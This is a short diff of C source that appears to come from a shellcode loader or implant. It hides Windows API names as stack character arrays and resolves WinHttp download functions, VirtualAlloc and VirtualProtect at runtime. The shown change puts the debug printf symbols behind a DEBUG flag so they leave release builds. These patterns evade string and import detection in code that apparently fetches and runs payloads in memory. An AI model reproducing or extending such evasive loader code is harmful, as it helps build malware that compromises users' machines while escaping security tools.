@@ -176,8 +176,10 @@ void myMain()
     CHAR winHttpReadData_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
     CHAR winHttpCloseHandle_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
     CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0 };
+    #ifdef DEBUG
     CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0 };
     CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
+    #endif
     CHAR snprintf_c[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0 };
     CHAR malloc_c[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
     CHAR calloc_c[] = { 'c', 'a', 'l', 'l', 'o', 'c', 0 };
@@ -225,8 +227,10 @@ void myMain()
     api->GetLastError = GetSymbolAddress((HANDLE)kernel32dll, getLastError_c);
     api->MessageBoxA = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
     api->MessageBoxW = GetSymbolAddress((HANDLE)user32dll, messageBoxW_c);
+    #ifdef DEBUG
     api->wprintf = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
     api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
+    #endif
     api->snprintf = GetSymbolAddress((HANDLE)msvcrtdll, snprintf_c);
     api->VirtualProtect = GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
     api->VirtualAlloc = GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c);
